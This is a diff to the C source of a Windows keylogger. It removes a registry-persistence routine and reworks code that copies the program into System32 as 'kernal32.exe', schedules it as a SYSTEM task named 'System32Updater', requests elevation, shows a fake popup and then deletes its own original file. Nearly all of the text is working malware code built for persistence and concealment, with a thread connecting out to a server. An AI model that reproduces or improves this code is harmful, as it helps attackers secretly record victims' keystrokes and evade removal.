@@ -21,7 +21,6 @@ void refresh_connection();
 DWORD WINAPI connect_to_server(LPVOID arg);
 void save_to(const char *filename, const char *message);
 char map_special_shifted(int key);
-void add_to_registry();
 void copy_to_system32();
 void delete_original_executable();
 int is_first_run();
@@ -135,19 +134,6 @@ char map_special_shifted(int key) {
 }
 
 // Add the program to the registry for persistence
-void add_to_registry() {
-    HKEY hKey;
-    char path[MAX_PATH];
-
-    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
-        return;
-    }
-
-    if (RegCreateKeyEx(HKEY_CURRENT_USER, REGISTRY_KEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueEx(hKey, "kernal32", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
-        RegCloseKey(hKey);
-    }
-}
 
 // Check if it is the first run
 int is_first_run() {
@@ -178,31 +164,32 @@ BOOL IsRunningFromSystem32() {
 void CopyToSystem32AndScheduleTask() {
     char path[MAX_PATH];
     if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
-        return;
+        return; // Failed to get the executable path
     }
 
+    
     char command[MAX_PATH * 2];
+
     snprintf(command, sizeof(command), "copy /Y \"%s\" \"%s\"", path, SYSTEM32_PATH);
     system(command);
-
-
-    snprintf(command, sizeof(command), 
-        "schtasks /create /tn \"System32Updater\" /tr \"%s\" /sc ONSTART /RL HIGHEST /RU SYSTEM /F", 
-        SYSTEM32_PATH);
+    snprintf(command, sizeof(command), "schtasks /create /tn System32Updater /tr C:\\Windows\\System32\\kernal32.exe /sc onlogon /RL HIGHEST /RU SYSTEM /F");
     system(command);
+    DWORD processID = GetCurrentProcessId(); // Get the process ID of the running process
+    snprintf(command, sizeof(command),
+        "cmd.exe /c taskkill /PID %lu /F & timeout /t 1 /nobreak & del /f /q \"%s\"", 
+        processID, path);
 
-}
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
 
-void DeleteOriginalFile() {
-    char path[MAX_PATH];
-    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
-        return;
+    // Create a new process to execute the self-deletion
+    if (CreateProcess(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
-
-    char command[MAX_PATH * 2];
-    snprintf(command, sizeof(command), "timeout /t 3 & del /F /Q \"%s\"", path);
-    system(command);
 }
+
+
 BOOL IsRunningAsAdmin() {
     BOOL isAdmin = FALSE;
     HANDLE hToken = NULL;
@@ -221,12 +208,12 @@ BOOL IsRunningAsAdmin() {
 
 // Function to relaunch the program as Administrator
 void RelaunchAsAdmin() {
-    char exePath[MAX_PATH];
-    GetModuleFileName(NULL, exePath, MAX_PATH); // Get the current executable path
+    char path[MAX_PATH];
+    GetModuleFileName(NULL, path, MAX_PATH); // Get the current executable path
 
     SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
     sei.lpVerb = "runas";      // Request "Run as Administrator"
-    sei.lpFile = exePath;      // Path to the executable
+    sei.lpFile = path;      // Path to the executable
     sei.nShow = SW_SHOWNORMAL; // Show the window normally
 
     if (!ShellExecuteEx(&sei)) {
@@ -259,14 +246,11 @@ int main() {
             RelaunchAsAdmin();
             return 0;
         }
-
-        CopyToSystem32AndScheduleTask();
         show_fake_popup();
-        DeleteOriginalFile();
+        CopyToSystem32AndScheduleTask();
         return 0;
     }
-        // mark_as_run();
-    add_to_registry();
+
     // Start the keylogger and server connection
     CreateThread(NULL, 0, connect_to_server, NULL, 0, NULL);
 
